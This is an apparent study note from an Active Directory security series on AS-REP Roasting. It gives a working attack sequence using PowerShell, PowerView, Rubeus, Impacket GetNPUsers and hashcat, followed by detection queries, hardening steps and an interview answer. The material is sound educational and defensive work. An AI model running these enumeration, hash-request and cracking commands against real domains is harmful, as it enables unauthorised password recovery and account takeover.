# 06 — AS-REP Roasting

> **Section:** 05 — AD Attack Techniques  
> **Difficulty:** Intermediate  
> **Protocol exploited:** Kerberos pre-authentication  
> **Privilege required:** None (unauthenticated for user enumeration) or any domain user

---

## 📌 What is AS-REP Roasting?

Normally, Kerberos requires **pre-authentication** — the client must prove they know the password before the KDC issues a TGT. This prevents offline attacks.

Some accounts have **"Do not require Kerberos preauthentication"** enabled — often for legacy application compatibility. For these accounts, the KDC responds to ANY authentication request with an AS-REP containing data encrypted with the user's password hash — **without verifying the requester's identity first**.

> **Simple definition:**  
> AS-REP Roasting requests TGTs for accounts with pre-authentication disabled. The KDC helpfully returns an encrypted blob without checking who is asking — which can be cracked offline to recover the password.

---

## ⚙️ Step-by-Step Attack

```
Step 1: Find accounts with pre-auth disabled

  PowerShell:
  Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} \
      -Properties DoesNotRequirePreAuth | Select-Object Name, SamAccountName

  PowerView:
  Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

Step 2: Request AS-REP for vulnerable accounts

  Rubeus (from domain machine):
  Rubeus.exe asreproast /outfile:asrep_hashes.txt

  Impacket (from Linux — no domain account needed!):
  python3 GetNPUsers.py company.local/ \
      -usersfile users.txt \
      -dc-ip 192.168.1.10 \
      -format hashcat \
      -outputfile asrep_hashes.txt
  
  ← Note: GetNPUsers can run WITHOUT a domain account if usernames are known
  ← Makes this attack possible without any existing access

  Hash format:
  $krb5asrep$23$hareesh-legacy@company.local:abc123...

Step 3: Crack offline
  hashcat -m 18200 asrep_hashes.txt rockyou.txt
  hashcat -m 18200 asrep_hashes.txt rockyou.txt -r rules/best64.rule

Step 4: Authenticate with cracked password
  Attacker logs in as the compromised account
```

---

## 🔍 Detection

```
Event ID 4768 — Kerberos TGT requested
  Normal: Pre-authentication type = 2 (Encrypted Timestamp)
  AS-REP Roasting: Pre-authentication type = 0 (No pre-auth)
  → Pre-auth type 0 should NEVER appear in a hardened environment

KQL for Sentinel:
  SecurityEvent
  | where EventID == 4768
  | where PreAuthType == "0"
  | project TimeGenerated, TargetAccount, IpAddress
```

---

## 🛡️ Defence

```
1. Enable pre-auth on ALL accounts (most important):
   Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} |
       Set-ADUser -DoesNotRequirePreAuth $false

2. If pre-auth must be disabled for a legacy app:
   → Set a very long, complex password (25+ chars)
   → Monitor for AS-REP requests for that account (Event ID 4768, type 0)
   → Isolate the account's permissions — minimum necessary only

3. Alert on ANY Event ID 4768 with pre-auth type 0
   → This should never happen in a properly configured domain
```

---

## 🎯 Key Interview Question

**Q: What is the difference between Kerberoasting and AS-REP Roasting?**  
**A:** Kerberoasting targets accounts WITH SPNs — any domain user requests service tickets encrypted with the service account's hash. AS-REP Roasting targets accounts with Kerberos pre-authentication DISABLED — an attacker (potentially unauthenticated) requests a TGT, and the KDC returns an AS-REP encrypted with the target's hash without verifying the requester. Kerberoasting requires authentication; AS-REP Roasting does not.

---

*"One configuration checkbox — 'Do not require Kerberos preauthentication' — can make an account attackable from the internet without any credentials. Audit this setting across your entire domain today."*
